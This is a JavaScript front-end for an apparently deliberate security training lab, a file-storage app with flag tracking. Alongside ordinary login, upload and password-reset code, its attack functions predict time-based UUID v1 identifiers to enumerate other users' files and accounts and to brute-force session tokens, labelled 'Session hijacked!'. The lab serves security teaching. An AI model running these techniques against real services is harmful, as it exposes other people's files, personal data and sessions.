// File Storage Lab - Authentication Logic

async function login() {
    const username = document.getElementById('loginUsername').value.trim();
    const password = document.getElementById('loginPassword').value.trim();
    
    if (!username || !password) {
        app.showError('Please enter both username and password');
        return;
    }
    
    try {
        const response = await fetch(`${app.apiBase}/login`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            credentials: 'include',
            body: JSON.stringify({
                username: username,
                password: password
            })
        });
        
        const data = await response.json();
        
        if (response.ok) {
            app.currentUser = {
                user_id: data.user_id,
                username: data.username,
                email: data.email,
                role: data.role
            };
            app.currentSession = data.session_id;
            
            app.showSuccess(`Welcome back, ${data.username}!`);
            
            // Close modal
            const modal = bootstrap.Modal.getInstance(document.getElementById('loginModal'));
            modal.hide();
            
            // Clear form
            document.getElementById('loginForm').reset();
            
            // Ensure session cookie is set before proceeding
            const sessionReady = await waitForSessionEstablishment();
            if (!sessionReady) {
                app.showError('Login succeeded but session not established. Please retry.');
                return;
            }

            // Ensure currentUser is set from login response (in case waitForSessionEstablishment didn't update it)
            if (!app.currentUser || app.currentUser.user_id !== data.user_id) {
                app.currentUser = {
                    user_id: data.user_id,
                    username: data.username,
                    email: data.email,
                    role: data.role
                };
            }

            // Switch UI to authenticated state and load data
            app.showAuthenticatedScreen();
            await app.loadFiles();
            await app.loadAdminData();
        } else {
            app.showError(data.error || 'Login failed');
        }
    } catch (error) {
        console.error('Login error:', error);
        app.showError('Login failed. Please try again.');
    }
}

async function register() {
    const username = document.getElementById('registerUsername').value.trim();
    const email = document.getElementById('registerEmail').value.trim();
    const password = document.getElementById('registerPassword').value.trim();
    const passwordConfirm = document.getElementById('registerPasswordConfirm').value.trim();
    const securityQuestion = document.getElementById('securityQuestion').value.trim();
    const securityAnswer = document.getElementById('securityAnswer').value.trim();
    
    if (!username || !email || !password || !passwordConfirm || !securityQuestion || !securityAnswer) {
        app.showError('Please fill in all fields');
        return;
    }
    
    if (password.length < 6) {
        app.showError('Password must be at least 6 characters long');
        return;
    }
    
    if (password !== passwordConfirm) {
        app.showError('Passwords do not match');
        return;
    }
    
    try {
        const response = await fetch(`${app.apiBase}/register`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            credentials: 'include',
            body: JSON.stringify({
                username: username,
                email: email,
                password: password,
                security_question: securityQuestion,
                security_answer: securityAnswer
            })
        });
        
        const data = await response.json();
        
        if (response.ok) {
            app.showSuccess('Registration successful! Please log in.');
            
            // Close modal
            const modal = bootstrap.Modal.getInstance(document.getElementById('registerModal'));
            modal.hide();
            
            // Clear form
            document.getElementById('registerForm').reset();
            
            // Show login modal
            setTimeout(() => {
                showLoginModal();
            }, 1000);
        } else {
            app.showError(data.error || 'Registration failed');
        }
    } catch (error) {
        console.error('Registration error:', error);
        app.showError('Registration failed. Please try again.');
    }
}

async function logout() {
    try {
        const response = await fetch(`${app.apiBase}/logout`, {
            method: 'POST',
            credentials: 'include'
        });
        
        if (response.ok) {
            // Clear user state immediately
            app.currentUser = null;
            app.currentSession = null;
            
            // Clear UI elements immediately
            const usernameElement = document.getElementById('current-username');
            const roleBadge = document.getElementById('user-role-badge');
            const authButtons = document.getElementById('auth-buttons');
            const userMenu = document.getElementById('user-menu');
            
            if (usernameElement) usernameElement.textContent = '';
            if (roleBadge) {
                roleBadge.textContent = '';
                roleBadge.className = 'badge';
            }
            
            // Hide user menu, show auth buttons - force update
            if (userMenu) {
                userMenu.style.display = 'none';
                userMenu.style.visibility = 'hidden';
                // Force reflow to ensure it's hidden
                userMenu.offsetHeight;
            }
            if (authButtons) {
                authButtons.style.display = 'flex';
                authButtons.style.visibility = 'visible';
                // Force reflow to ensure it's shown
                authButtons.offsetHeight;
            }
            
            // Clear login form
            const loginForm = document.getElementById('loginForm');
            if (loginForm) {
                loginForm.reset();
            }
            
            // Clear register form
            const registerForm = document.getElementById('registerForm');
            if (registerForm) {
                registerForm.reset();
            }
            
            // Show welcome screen (this will also clear everything)
            app.showWelcomeScreen();
            
            // Double-check UI state after a brief delay - be aggressive
            setTimeout(() => {
                const checkUserMenu = document.getElementById('user-menu');
                const checkAuthButtons = document.getElementById('auth-buttons');
                if (checkUserMenu) {
                    checkUserMenu.style.display = 'none';
                    checkUserMenu.style.visibility = 'hidden';
                    checkUserMenu.style.opacity = '0';
                    checkUserMenu.setAttribute('hidden', 'true');
                }
                if (checkAuthButtons) {
                    checkAuthButtons.style.display = 'flex';
                    checkAuthButtons.style.visibility = 'visible';
                    checkAuthButtons.style.opacity = '1';
                    checkAuthButtons.removeAttribute('hidden');
                }
            }, 100);
            
            app.showSuccess('Logged out successfully');
        } else {
            app.showError('Logout failed');
        }
    } catch (error) {
        console.error('Logout error:', error);
        app.showError('Logout failed');
        // Still show welcome screen on error
        app.showWelcomeScreen();
    }
}

function toggleMultipleFiles() {
    const fileInput = document.getElementById('fileInput');
    const multipleFilesCheck = document.getElementById('multipleFilesCheck');
    const filesCount = document.getElementById('filesCount');
    const selectedFilesList = document.getElementById('selectedFilesList');
    
    if (multipleFilesCheck.checked) {
        fileInput.setAttribute('multiple', 'multiple');
        filesCount.textContent = 's';
        fileInput.addEventListener('change', updateSelectedFilesList);
    } else {
        fileInput.removeAttribute('multiple');
        filesCount.textContent = '';
        selectedFilesList.style.display = 'none';
        fileInput.removeEventListener('change', updateSelectedFilesList);
    }
}

function updateSelectedFilesList() {
    const fileInput = document.getElementById('fileInput');
    const selectedFilesList = document.getElementById('selectedFilesList');
    
    if (fileInput.files.length > 0) {
        selectedFilesList.style.display = 'block';
        selectedFilesList.innerHTML = `
            <small class="text-muted">
                <strong>Selected files (${fileInput.files.length}):</strong>
                <ul class="mb-0 mt-1">
                    ${Array.from(fileInput.files).map(file => `<li>${file.name} (${(file.size / 1024).toFixed(2)} KB)</li>`).join('')}
                </ul>
            </small>
        `;
    } else {
        selectedFilesList.style.display = 'none';
    }
}

async function uploadFile() {
    const fileInput = document.getElementById('fileInput');
    const multipleFilesCheck = document.getElementById('multipleFilesCheck');
    const files = Array.from(fileInput.files);
    
    if (files.length === 0) {
        app.showError('Please select at least one file to upload');
        return;
    }
    
    // Validate all files
    const allowedTypes = ['txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif', 'doc', 'docx', 'zip'];
    
    for (const file of files) {
        const fileExtension = file.name.split('.').pop().toLowerCase();
        
        if (!allowedTypes.includes(fileExtension)) {
            app.showError(`File type not allowed: ${file.name}. Please select a supported file type.`);
            return;
        }
        
        if (file.size > 10 * 1024 * 1024) {
            app.showError(`File size too large: ${file.name}. Maximum size is 10MB.`);
            return;
        }
    }
    
    // If multiple files selected, upload them in sequence
    if (files.length > 1) {
        await uploadMultipleFiles(files);
    } else {
        await uploadSingleFile(files[0]);
    }
}

async function uploadSingleFile(file) {
    const formData = new FormData();
    formData.append('file', file);
    
    try {
        const response = await fetch(`${app.apiBase}/files/upload`, {
            method: 'POST',
            credentials: 'include',
            body: formData
        });
        
        const data = await response.json();
        
        if (response.ok) {
            app.showSuccess(`File "${file.name}" uploaded successfully!`);
            
            // Store flag file ID if created (for internal tracking)
            if (data.flag_file_id) {
                app.flagFileId = data.flag_file_id;
                app.firstFileId = data.file_id; // Store first file UUID
            }
            
            // Close modal
            const modal = bootstrap.Modal.getInstance(document.getElementById('uploadModal'));
            modal.hide();
            
            // Clear form
            document.getElementById('uploadForm').reset();
            document.getElementById('selectedFilesList').style.display = 'none';
            
            // Refresh files and activity feed immediately
            await app.loadFiles();
            await app.loadAdminData();
            await app.loadStats();
            
            // Refresh activity feed to show user's upload and admin's response
            await app.loadActivityFeed();
        } else {
            app.showError(data.error || 'Upload failed');
        }
    } catch (error) {
        console.error('Upload error:', error);
        app.showError('Upload failed. Please try again.');
    }
}

async function uploadMultipleFiles(files) {
    // Upload first file
    const firstFile = files[0];
    const formData1 = new FormData();
    formData1.append('file', firstFile);
    formData1.append('is_first_file', 'true');
    
    try {
        // Upload first file
        const response1 = await fetch(`${app.apiBase}/files/upload`, {
            method: 'POST',
            credentials: 'include',
            body: formData1
        });
        
        const data1 = await response1.json();
        
        if (!response1.ok) {
            app.showError(data1.error || 'First file upload failed');
            return;
        }
        
        app.showSuccess(`File "${firstFile.name}" uploaded successfully!`);
        
        // Store flag file ID if created (for internal tracking)
        if (data1.flag_file_id) {
            app.flagFileId = data1.flag_file_id;
            app.firstFileId = data1.file_id;
        }
        
        // Wait 0.4 seconds before uploading second file
        await new Promise(resolve => setTimeout(resolve, 400));
        
        // Upload second file (if exists)
        if (files.length > 1) {
            const secondFile = files[1];
            const formData2 = new FormData();
            formData2.append('file', secondFile);
            formData2.append('is_second_file', 'true');
            
            const response2 = await fetch(`${app.apiBase}/files/upload`, {
                method: 'POST',
                credentials: 'include',
                body: formData2
            });
            
            const data2 = await response2.json();
            
            if (response2.ok) {
                app.showSuccess(`File "${secondFile.name}" uploaded successfully!`);
            } else {
                app.showError(data2.error || 'Second file upload failed');
            }
        }
        
        // Close modal
        const modal = bootstrap.Modal.getInstance(document.getElementById('uploadModal'));
        modal.hide();
        
        // Clear form
        document.getElementById('uploadForm').reset();
        document.getElementById('selectedFilesList').style.display = 'none';
        document.getElementById('multipleFilesCheck').checked = false;
        document.getElementById('fileInput').removeAttribute('multiple');
        
        // Refresh files and activity feed immediately
        await app.loadFiles();
        await app.loadAdminData();
        await app.loadStats();
        
        // Refresh activity feed to show all uploads
        await app.loadActivityFeed();
        
    } catch (error) {
        console.error('Upload error:', error);
        app.showError('Upload failed. Please try again.');
    }
}

// Attack execution functions
async function executeFileEnumeration() {
    const baseFileId = document.getElementById('baseFileId').value.trim();
    const timeRange = parseInt(document.getElementById('timeRange').value);
    
    if (!baseFileId) {
        app.showError('Please enter a base file ID');
        return;
    }
    
    const resultsContainer = document.getElementById('enumerationResults');
    resultsContainer.innerHTML = '<div class="text-center"><i class="fas fa-spinner fa-spin fa-2x"></i><p>Executing attack...</p></div>';
    
    try {
        // Parse UUID v1 to extract timestamp
        const uuidParts = baseFileId.split('-');
        if (uuidParts.length !== 5) {
            throw new Error('Invalid UUID format');
        }
        
        // Extract timestamp from UUID v1
        const timestampHex = uuidParts[0] + uuidParts[1] + uuidParts[2];
        const timestamp = parseInt(timestampHex, 16);
        
        const results = [];
        const startTime = timestamp - (timeRange * 10000000); // Convert seconds to 100ns units
        const endTime = timestamp + (timeRange * 10000000);
        
        // Generate UUIDs in time range
        for (let time = startTime; time <= endTime; time += 10000000) { // 1 second steps
            const timeHex = time.toString(16).padStart(12, '0');
            const newUuid = `${timeHex.slice(0,8)}-${timeHex.slice(8,12)}-1${timeHex.slice(12,15)}-${uuidParts[3]}-${uuidParts[4]}`;
            
            try {
                const response = await fetch(`${app.apiBase}/files/${newUuid}`, {
                    credentials: 'include'
                });
                
                if (response.ok) {
                    results.push({
                        uuid: newUuid,
                        status: 'success',
                        message: 'File found!'
                    });
                } else if (response.status === 404) {
                    results.push({
                        uuid: newUuid,
                        status: 'failure',
                        message: 'File not found'
                    });
                } else {
                    results.push({
                        uuid: newUuid,
                        status: 'info',
                        message: `HTTP ${response.status}`
                    });
                }
            } catch (error) {
                results.push({
                    uuid: newUuid,
                    status: 'failure',
                    message: 'Request failed'
                });
            }
            
            // Small delay to avoid overwhelming the server
            await new Promise(resolve => setTimeout(resolve, 100));
        }
        
        // Display results
        const successCount = results.filter(r => r.status === 'success').length;
        const totalCount = results.length;
        
        resultsContainer.innerHTML = `
            <div class="alert alert-info">
                <strong>Attack Results:</strong> Found ${successCount} files out of ${totalCount} attempts
            </div>
            <div class="attack-results">
                ${results.map(result => `
                    <div class="attack-result attack-${result.status}">
                        <div class="d-flex justify-content-between align-items-center">
                            <div>
                                <code>${result.uuid}</code>
                                <br><small>${result.message}</small>
                            </div>
                            <span class="badge bg-${result.status === 'success' ? 'success' : result.status === 'failure' ? 'danger' : 'info'}">
                                ${result.status}
                            </span>
                        </div>
                    </div>
                `).join('')}
            </div>
        `;
        
    } catch (error) {
        console.error('File enumeration error:', error);
        resultsContainer.innerHTML = `
            <div class="alert alert-danger">
                <strong>Error:</strong> ${error.message}
            </div>
        `;
    }
}

async function executeUserDiscovery() {
    const baseUserId = document.getElementById('baseUserId').value.trim();
    const timeRange = parseInt(document.getElementById('userTimeRange').value);
    
    if (!baseUserId) {
        app.showError('Please enter a base user ID');
        return;
    }
    
    const resultsContainer = document.getElementById('userDiscoveryResults');
    resultsContainer.innerHTML = '<div class="text-center"><i class="fas fa-spinner fa-spin fa-2x"></i><p>Executing attack...</p></div>';
    
    try {
        // Parse UUID v1 to extract timestamp
        const uuidParts = baseUserId.split('-');
        if (uuidParts.length !== 5) {
            throw new Error('Invalid UUID format');
        }
        
        // Extract timestamp from UUID v1
        const timestampHex = uuidParts[0] + uuidParts[1] + uuidParts[2];
        const timestamp = parseInt(timestampHex, 16);
        
        const results = [];
        const startTime = timestamp - (timeRange * 10000000); // Convert seconds to 100ns units
        const endTime = timestamp + (timeRange * 10000000);
        
        // Generate UUIDs in time range
        for (let time = startTime; time <= endTime; time += 10000000) { // 1 second steps
            const timeHex = time.toString(16).padStart(12, '0');
            const newUuid = `${timeHex.slice(0,8)}-${timeHex.slice(8,12)}-1${timeHex.slice(12,15)}-${uuidParts[3]}-${uuidParts[4]}`;
            
            try {
                const response = await fetch(`${app.apiBase}/user/${newUuid}`, {
                    credentials: 'include'
                });
                
                if (response.ok) {
                    const userData = await response.json();
                    results.push({
                        uuid: newUuid,
                        status: 'success',
                        message: `User found: ${userData.username} (${userData.role})`,
                        userData: userData
                    });
                } else if (response.status === 404) {
                    results.push({
                        uuid: newUuid,
                        status: 'failure',
                        message: 'User not found'
                    });
                } else {
                    results.push({
                        uuid: newUuid,
                        status: 'info',
                        message: `HTTP ${response.status}`
                    });
                }
            } catch (error) {
                results.push({
                    uuid: newUuid,
                    status: 'failure',
                    message: 'Request failed'
                });
            }
            
            // Small delay to avoid overwhelming the server
            await new Promise(resolve => setTimeout(resolve, 100));
        }
        
        // Display results
        const successCount = results.filter(r => r.status === 'success').length;
        const totalCount = results.length;
        
        resultsContainer.innerHTML = `
            <div class="alert alert-info">
                <strong>Attack Results:</strong> Found ${successCount} users out of ${totalCount} attempts
            </div>
            <div class="attack-results">
                ${results.map(result => `
                    <div class="attack-result attack-${result.status}">
                        <div class="d-flex justify-content-between align-items-center">
                            <div>
                                <code>${result.uuid}</code>
                                <br><small>${result.message}</small>
                                ${result.userData ? `
                                    <br><small class="text-muted">
                                        Email: ${result.userData.email} | 
                                        Created: ${new Date(result.userData.created_at).toLocaleDateString()}
                                    </small>
                                ` : ''}
                            </div>
                            <span class="badge bg-${result.status === 'success' ? 'success' : result.status === 'failure' ? 'danger' : 'info'}">
                                ${result.status}
                            </span>
                        </div>
                    </div>
                `).join('')}
            </div>
        `;
        
    } catch (error) {
        console.error('User discovery error:', error);
        resultsContainer.innerHTML = `
            <div class="alert alert-danger">
                <strong>Error:</strong> ${error.message}
            </div>
        `;
    }
}

async function executeSessionHijacking() {
    const timeRange = parseInt(document.getElementById('sessionTimeRange').value);
    
    if (!app.currentSession) {
        app.showError('You must be logged in to test session hijacking');
        return;
    }
    
    const resultsContainer = document.getElementById('sessionHijackingResults');
    resultsContainer.innerHTML = '<div class="text-center"><i class="fas fa-spinner fa-spin fa-2x"></i><p>Executing attack...</p></div>';
    
    try {
        // Parse current session UUID v1 to extract timestamp
        const uuidParts = app.currentSession.split('-');
        if (uuidParts.length !== 5) {
            throw new Error('Invalid session UUID format');
        }
        
        // Extract timestamp from UUID v1
        const timestampHex = uuidParts[0] + uuidParts[1] + uuidParts[2];
        const timestamp = parseInt(timestampHex, 16);
        
        const results = [];
        const startTime = timestamp - (timeRange * 10000000); // Convert seconds to 100ns units
        const endTime = timestamp + (timeRange * 10000000);
        
        // Generate UUIDs in time range
        for (let time = startTime; time <= endTime; time += 10000000) { // 1 second steps
            const timeHex = time.toString(16).padStart(12, '0');
            const newUuid = `${timeHex.slice(0,8)}-${timeHex.slice(8,12)}-1${timeHex.slice(12,15)}-${uuidParts[3]}-${uuidParts[4]}`;
            
            try {
                // Test session by trying to access files with the new session
                const response = await fetch(`${app.apiBase}/files`, {
                    headers: {
                        'Authorization': `Bearer ${newUuid}`
                    },
                    credentials: 'include'
                });
                
                if (response.ok) {
                    results.push({
                        uuid: newUuid,
                        status: 'success',
                        message: 'Session hijacked!'
                    });
                } else if (response.status === 401) {
                    results.push({
                        uuid: newUuid,
                        status: 'failure',
                        message: 'Invalid session'
                    });
                } else {
                    results.push({
                        uuid: newUuid,
                        status: 'info',
                        message: `HTTP ${response.status}`
                    });
                }
            } catch (error) {
                results.push({
                    uuid: newUuid,
                    status: 'failure',
                    message: 'Request failed'
                });
            }
            
            // Small delay to avoid overwhelming the server
            await new Promise(resolve => setTimeout(resolve, 100));
        }
        
        // Display results
        const successCount = results.filter(r => r.status === 'success').length;
        const totalCount = results.length;
        
        resultsContainer.innerHTML = `
            <div class="alert alert-info">
                <strong>Attack Results:</strong> Successfully hijacked ${successCount} sessions out of ${totalCount} attempts
            </div>
            <div class="alert alert-warning">
                <i class="fas fa-exclamation-triangle me-2"></i>
                <strong>Note:</strong> This attack demonstrates the vulnerability. In a real scenario, 
                hijacked sessions could be used to access other users' files.
            </div>
            <div class="attack-results">
                ${results.map(result => `
                    <div class="attack-result attack-${result.status}">
                        <div class="d-flex justify-content-between align-items-center">
                            <div>
                                <code>${result.uuid}</code>
                                <br><small>${result.message}</small>
                            </div>
                            <span class="badge bg-${result.status === 'success' ? 'success' : result.status === 'failure' ? 'danger' : 'info'}">
                                ${result.status}
                            </span>
                        </div>
                    </div>
                `).join('')}
            </div>
        `;
        
    } catch (error) {
        console.error('Session hijacking error:', error);
        resultsContainer.innerHTML = `
            <div class="alert alert-danger">
                <strong>Error:</strong> ${error.message}
            </div>
        `;
    }
}

// User deletion functions
async function deleteUser(userId, username) {
    if (!confirm(`Are you sure you want to delete user "${username}"?\n\nThis will permanently delete:\n- User account\n- All user files\n- All user sessions\n\nThis action cannot be undone!`)) {
        return;
    }
    
    try {
        const response = await fetch(`${app.apiBase}/delete_user/${userId}`, {
            method: 'DELETE',
            credentials: 'include'
        });
        
        const data = await response.json();
        
        if (response.ok) {
            app.showSuccess(`User "${username}" deleted successfully!`);
            app.showSuccess(`Deleted ${data.files_deleted} files and ${data.sessions_deleted} sessions`);
            
            // Refresh admin data
            await app.loadAdminData();
            await app.loadStats();
        } else {
            app.showError(data.error || 'Failed to delete user');
        }
    } catch (error) {
        console.error('Delete user error:', error);
        app.showError('Failed to delete user. Please try again.');
    }
}

async function deleteOwnAccount() {
    if (!app.currentUser) {
        app.showError('You must be logged in to delete your account');
        return;
    }
    
    const confirmText = `Are you sure you want to delete your account?\n\nThis will permanently delete:\n- Your account\n- All your files\n- All your sessions\n\nThis action cannot be undone!`;
    
    if (!confirm(confirmText)) {
        return;
    }
    
    // Double confirmation for account deletion
    if (!confirm('This is your final warning. Are you absolutely sure you want to delete your account?')) {
        return;
    }
    
    try {
        const response = await fetch(`${app.apiBase}/users/${app.currentUser.user_id}`, {
            method: 'DELETE',
            credentials: 'include'
        });
        
        const data = await response.json();
        
        if (response.ok) {
            // Clear user state immediately
            app.currentUser = null;
            app.currentSession = null;
            
            // Clear UI elements immediately
            const usernameElement = document.getElementById('current-username');
            const roleBadge = document.getElementById('user-role-badge');
            const authButtons = document.getElementById('auth-buttons');
            const userMenu = document.getElementById('user-menu');
            
            if (usernameElement) usernameElement.textContent = '';
            if (roleBadge) {
                roleBadge.textContent = '';
                roleBadge.className = 'badge';
            }
            
            // Hide user menu, show auth buttons - force update with multiple methods
            if (userMenu) {
                userMenu.style.display = 'none';
                userMenu.style.visibility = 'hidden';
                userMenu.style.opacity = '0';
                userMenu.setAttribute('hidden', 'true');
                // Force reflow to ensure it's hidden
                userMenu.offsetHeight;
            }
            if (authButtons) {
                authButtons.style.display = 'flex';
                authButtons.style.visibility = 'visible';
                authButtons.style.opacity = '1';
                authButtons.removeAttribute('hidden');
                // Force reflow to ensure it's shown
                authButtons.offsetHeight;
            }
            
            // Clear forms
            const loginForm = document.getElementById('loginForm');
            if (loginForm) loginForm.reset();
            const registerForm = document.getElementById('registerForm');
            if (registerForm) registerForm.reset();
            
            // Show success messages
            app.showSuccess('Your account has been deleted successfully');
            app.showSuccess(`Deleted ${data.files_deleted} files and ${data.sessions_deleted} sessions`);
            
            // Show welcome screen (this will clear user state)
            app.showWelcomeScreen();
            
            // Double-check UI state after a brief delay - be aggressive
            setTimeout(() => {
                const checkUserMenu = document.getElementById('user-menu');
                const checkAuthButtons = document.getElementById('auth-buttons');
                if (checkUserMenu) {
                    checkUserMenu.style.display = 'none';
                    checkUserMenu.style.visibility = 'hidden';
                    checkUserMenu.style.opacity = '0';
                    checkUserMenu.setAttribute('hidden', 'true');
                }
                if (checkAuthButtons) {
                    checkAuthButtons.style.display = 'flex';
                    checkAuthButtons.style.visibility = 'visible';
                    checkAuthButtons.style.opacity = '1';
                    checkAuthButtons.removeAttribute('hidden');
                }
            }, 100);
        } else {
            app.showError(data.error || 'Failed to delete account');
        }
    } catch (error) {
        console.error('Delete account error:', error);
        app.showError('Failed to delete account. Please try again.');
    }
}

// Forgot password functions
function showForgotPasswordModal() {
    const modal = new bootstrap.Modal(document.getElementById('forgotPasswordModal'));
    modal.show();
    
    // Reset form
    document.getElementById('forgotPasswordForm').reset();
    document.getElementById('securityQuestionDiv').style.display = 'none';
    document.getElementById('newPasswordDiv').style.display = 'none';
    document.getElementById('forgotPasswordBtn').textContent = 'Get Security Question';
    document.getElementById('forgotPasswordBtn').onclick = getSecurityQuestion;
}

async function getSecurityQuestion() {
    const username = document.getElementById('forgotUsername').value.trim();
    
    if (!username) {
        app.showError('Please enter your username');
        return;
    }
    
    try {
        const response = await fetch(`${app.apiBase}/forgot-password`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            credentials: 'include',
            body: JSON.stringify({
                username: username
            })
        });
        
        const data = await response.json();
        
        if (response.ok) {
            document.getElementById('securityQuestionLabel').textContent = data.security_question;
            document.getElementById('securityQuestionDiv').style.display = 'block';
            document.getElementById('newPasswordDiv').style.display = 'block';
            document.getElementById('forgotPasswordBtn').textContent = 'Reset Password';
            document.getElementById('forgotPasswordBtn').onclick = resetPassword;
        } else {
            app.showError(data.error || 'Failed to get security question');
        }
    } catch (error) {
        console.error('Forgot password error:', error);
        app.showError('Failed to get security question. Please try again.');
    }
}

async function resetPassword() {
    const username = document.getElementById('forgotUsername').value.trim();
    const securityAnswer = document.getElementById('forgotSecurityAnswer').value.trim();
    const newPassword = document.getElementById('newPassword').value.trim();
    
    if (!username || !securityAnswer || !newPassword) {
        app.showError('Please fill in all fields');
        return;
    }
    
    if (newPassword.length < 6) {
        app.showError('Password must be at least 6 characters long');
        return;
    }
    
    try {
        const response = await fetch(`${app.apiBase}/reset-password`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            credentials: 'include',
            body: JSON.stringify({
                username: username,
                security_answer: securityAnswer,
                new_password: newPassword
            })
        });
        
        const data = await response.json();
        
        if (response.ok) {
            app.showSuccess('Password reset successfully! Please log in with your new password.');
            
            // Close modal
            const modal = bootstrap.Modal.getInstance(document.getElementById('forgotPasswordModal'));
            modal.hide();
            
            // Clear form
            document.getElementById('forgotPasswordForm').reset();
            document.getElementById('securityQuestionDiv').style.display = 'none';
            document.getElementById('newPasswordDiv').style.display = 'none';
            
            // Show login modal
            setTimeout(() => {
                showLoginModal();
            }, 1000);
        } else {
            app.showError(data.error || 'Password reset failed');
        }
    } catch (error) {
        console.error('Password reset error:', error);
        app.showError('Password reset failed. Please try again.');
    }
}

// Helper: wait until server recognizes the session cookie
async function waitForSessionEstablishment(maxAttempts = 5, delayMs = 150) {
    for (let attempt = 0; attempt < maxAttempts; attempt++) {
        try {
            const resp = await fetch(`${app.apiBase}/session/validate`, {
                credentials: 'include'
            });
            if (resp.ok) {
                // Cache current user for immediate UI use
                const userData = await resp.json();
                app.currentUser = userData;
                return true;
            }
        } catch (_) {}
        await new Promise(r => setTimeout(r, delayMs));
    }
    return false;
}
